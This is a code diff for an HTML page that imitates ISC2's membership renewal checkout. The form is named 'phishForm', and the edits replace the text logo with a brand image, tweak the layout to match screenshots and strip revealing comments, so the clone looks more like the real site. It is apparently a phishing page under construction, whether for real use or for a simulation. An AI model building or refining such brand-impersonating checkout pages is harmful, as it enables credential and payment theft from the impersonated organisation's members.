@@ -22,7 +22,7 @@
             --top-bar-bg: #2f2f2f; /* Dark grey for top utility bar */
         }
 
-        /* === NEW HEADER STYLES TO MATCH IMAGE === */
+        /* === HEADER STYLES === */
         header {
             width: 100%;
             background-color: #fff;
@@ -37,10 +37,10 @@
             padding: 8px 0;
         }
         .utility-container {
-            max-width: 1400px; /* Wider to match screenshot */
+            max-width: 1400px; 
             margin: 0 auto;
             display: flex;
-            justify-content: flex-end; /* Align items to the right */
+            justify-content: flex-end; 
             align-items: center;
             padding: 0 40px;
             gap: 20px;
@@ -57,25 +57,24 @@
         /* 2. Main Navigation Bar */
         .nav-bar {
             background-color: #fff;
-            padding: 20px 0;
+            padding: 15px 0; /* Slightly reduced padding to accommodate image */
         }
         .nav-container {
             max-width: 1400px;
             margin: 0 auto;
             display: flex;
-            justify-content: flex-start; /* Logo left, links next to it */
+            justify-content: flex-start; 
             align-items: center;
             padding: 0 40px;
         }
+        
+        /* Updated Logo Class to handle Image */
         .logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: #000; /* Black logo text as seen in image */
             text-decoration: none;
-            margin-right: 60px; /* Space between logo and links */
-            letter-spacing: -1px;
+            margin-right: 60px; 
+            display: flex;
+            align-items: center;
         }
-        .logo span { color: var(--isc2-green); } /* Make the '2' green if desired, or keep black */
 
         .nav-links {
             display: flex;
@@ -171,7 +170,9 @@
 
         <div class="nav-bar">
             <div class="nav-container">
-                <a href="#" class="logo">ISC2</a>
+                <a href="#" class="logo">
+                    <img src="image_02d785.png" alt="ISC2" style="height: 40px; margin: 10px 0 10px 0;">
+                </a>
                 
                 <nav class="nav-links">
                     <a href="https://www.isc2.org/">Get Started</a>
@@ -190,9 +191,6 @@
         
         <div class="checkout-section">
             <h1>Renewal Checkout</h1>
-            <!-- <div style="font-size: 13px; color: #666; background: #f0f0f0; padding: 8px 12px; border-radius: 4px; display: inline-block; margin-bottom: 25px;">
-                🔒 256-bit SSL Encrypted Payment
-            </div> -->
 
             <form id="phishForm">
                 <h2>Member Information</h2>
